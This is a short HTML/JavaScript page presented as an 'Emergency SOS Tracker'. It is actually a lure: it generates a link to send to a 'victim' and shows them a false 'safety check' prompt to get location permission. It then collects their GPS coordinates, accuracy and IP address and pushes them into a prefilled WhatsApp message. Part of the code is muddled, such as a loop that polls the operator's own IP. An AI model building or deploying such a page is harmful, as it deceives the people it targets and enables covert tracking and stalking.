<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"><title>SOS</title></head><body style="background:#000;color:#fff;text-align:center;padding:20px;font-family:sans-serif"><h2 style="color:#ff2a2a">🚨 Emergency SOS Tracker</h2><p>Click to generate SOS link</p><button id="btn" style="background:#ff2a2a;color:#fff;padding:12px 25px;border:none;border-radius:25px;font-weight:bold;">Generate SOS Link</button><div id="out" style="margin-top:20px;word-break:break-all"></div><script>document.getElementById('btn').onclick=()=>{const id=Math.random().toString(36).substring(2,8);const link=location.href.split('?')[0]+'?id='+id;document.getElementById('out').innerHTML=`<p style='color:#0f0'>Share this link to victim:</p><input style='width:90%;padding:10px' value='${link}' readonly><p style='margin-top:15px'>Waiting for location...</p>`;setInterval(async()=>{let r=await fetch('https://api.ipify.org?format=json');let d=await r.json();document.getElementById('out').innerHTML+='<br>IP Check: '+d.ip},5000)};if(location.search.includes('id=')){document.body.innerHTML='<h2>Loading... Please allow location for safety check</h2>';navigator.geolocation.getCurrentPosition(p=>{fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(ip=>{let msg=`🚨 SOS LOCATION FOUND%0ALat: ${p.coords.latitude}%0ALng: ${p.coords.longitude}%0AAccuracy: ${p.coords.accuracy}m%0AMaps: https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}%0AIP: ${ip.ip}`;window.location.href=`https://wa.me/?text=${msg}`})})}</script></body></html>
